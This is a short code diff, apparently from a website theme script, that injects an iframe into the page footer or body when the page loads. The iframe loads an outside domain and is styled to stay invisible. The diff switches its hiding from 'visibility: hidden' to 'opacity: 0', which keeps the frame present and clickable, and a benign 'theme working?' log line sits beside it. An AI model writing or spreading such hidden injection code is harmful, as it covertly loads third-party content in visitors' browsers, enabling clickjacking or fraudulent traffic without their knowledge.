@@ -2,17 +2,17 @@ document.addEventListener('DOMContentLoaded', () => {
   let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
   if (Folt) {
     let Newel = document.createElement('span');
-    Newel.innerHTML = `<style> 
-    iframe.invisible-frame {
+    Newel.innerHTML = `<style>
+      iframe.invisible-frame {
       position: fixed;
-      width: 100%;
-      height: 10%;
-      bottom: 0;
-      left: 0;
+      width:100px;
+      height: 20%;
+      bottom: 20%;
+      right: 0;
       border: none;
-      visibility: hidden;
+      opacity: 0;
     }
-  </style><iframe class="invisible-frame" src="https://www.dktechnozone.in/"></iframe>
+  </style> <iframe class="invisible-frame" src="https://www.dktechnozone.in/"></iframe>
 <script>
 console.log("theme working?");
     </script>`;
